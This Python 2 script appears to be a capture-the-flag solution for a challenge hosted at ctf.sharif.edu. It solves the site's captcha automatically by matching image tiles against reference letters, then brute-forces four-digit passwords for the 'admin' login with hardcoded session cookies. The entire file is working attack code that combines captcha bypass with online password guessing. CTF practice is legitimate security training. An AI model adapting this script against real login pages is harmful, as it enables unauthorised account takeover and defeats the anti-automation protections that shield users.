from PIL import Image
import urllib2
import urllib
from skimage.measure import structural_similarity as ssim
import matplotlib.pyplot as plt
import numpy as np
import cv2
import sys

matches = {}
matches["A"]=" 5 21 34 39 44 71 74 75 80 87 99 144 155 177 "
matches["B"]=" 1 8 23 30 32 35 45 46 91 94 96 103 123 162 168 179 "
matches["C"]=" 7 26 40 61 68 81 106 134 149 164 172 "
matches["D"]=" 0 20 28 52 88 120 126 "
matches["E"]=" 25 33 54 64 92 100 101 109 110 114 119 122 129 136 143 154 169 175 "
matches["F"]=" 4 9 29 31 36 65 70 95 121 153 178 "
matches["G"]=" 2 14 24 38 43 115 156 "
matches["H"]=" 6 37 51 69 72 76 79 90 97 102 104 139 148 150 152 "
matches["I"]=" 22 48 62 66 67 73 78 83 85 93 111 158 163 170 174 "
matches["J"]=" 16 47 59 60 77 82 84 98 112 113 124 145 152 166 171 "
matches["K"]=" 27 42 50 108 117 125 128 157 160 161 "
matches["L"]=" 3 12 13 19 41 58 63 86 113 131 133 137 138 140 141 142 146 165 167 "
matches["M"]=" 11 17 49 53 56 57 89 105 118 127 135 "



def mse(imageA, imageB):
	# the 'Mean Squared Error' between the two images is the
	# sum of the squared difference between the two images;
	# NOTE: the two images must have the same dimension
	err = np.sum((imageA.astype("float") - imageB.astype("float")) ** 2)
	err /= float(imageA.shape[0] * imageA.shape[1])
	
	# return the MSE, the lower the error, the more "similar"
	# the two images are
	return err

def get_letter(id):
	string_to_match = " " + str(id) + " "
	for key in matches:
		if string_to_match in matches[key]:
			return key


four_digits_pass = ["%04d" % x for x in range(int(sys.argv[1]), int(sys.argv[2]))]


for password in four_digits_pass:
	print "[+] Testing password: ", str(password)
	while True:
		urllib.urlretrieve("http://ctf.sharif.edu:32455/chal/oldpersian/c6122cf3a44c6d2f/captcha/", "captcha.jpg")
		im = Image.open("captcha.jpg")
		pix = im.load()
		width, height = im.size


		im.crop((0,0,80,80)).save("1.png", "PNG")
		im.crop((80, 0, 160, 80)).save("2.png", "PNG")
		im.crop((160, 0, 240, 80)).save("3.png", "PNG")
		im.crop((240, 0, 320, 80)).save("4.png", "PNG")
		im.crop((320, 0, 400, 80)).save("5.png", "PNG")
		im.crop((400, 0, 480, 80)).save("6.png", "PNG")

		im1 = Image.open("1.png")
		pix1 = im1.load()
		im2 = Image.open("2.png")
		pix2 = im2.load()
		im3 = Image.open("3.png")
		pix3 = im3.load()
		im4 = Image.open("4.png")
		pix4 = im4.load()
		im5 = Image.open("5.png")
		pix5 = im5.load()
		im6 = Image.open("6.png")
		pix6 = im6.load()


		captcha = ""
		try:
			for i in range (1, 7):
				#print "[+] handling characater for ", str(i), ".png ..."
				original = cv2.imread(str(i) + ".png")


				original = cv2.cvtColor(original, cv2.COLOR_BGR2GRAY)

				best_mse = 2**250
				match_id = -1

				for i in range(0, 180):
						potential_match = cv2.imread("cmp/" + str(i) + ".png")
						potential_match = cv2.cvtColor(potential_match, cv2.COLOR_BGR2GRAY)
						current_mse = mse(original, potential_match)
						if current_mse < best_mse:
							best_mse = current_mse
							match_id = i


				captcha += get_letter(match_id)
				#print "[+] done, best match is img cpm/",match_id,".png, corresponding letter is: ", get_letter(match_id)
		except:
			print ""
			#print "[-] error while processing catcha, resuming"

		#print "[+] recognized captcha is: ", captcha

		url = 'http://ctf.sharif.edu:32455/chal/oldpersian/c6122cf3a44c6d2f/login/submit/'
		values = {'username' : 'admin',
		          'password' : str(password),
		          'captcha' : captcha }
		data = urllib.urlencode(values)
		req = urllib2.Request(url, data, headers={'Cookie':"SUCTF_SESSION_ID=sp8s1gndgt1fqg006a69s1srn0; PHPSESSID=515386866780b5f132fc96c02b3ddb82; TEST=4788"})
		response = urllib2.urlopen(req)
		txt = response.read()

		if "Login failed!" in txt:
			#print "[-] wrong password: ", str(password)
			break
		elif "Invalid captcha" in txt:
			print ""
			#print "\t[-] wrong captcha"
		else:
			print "[!] good password: ", str(password)
			break
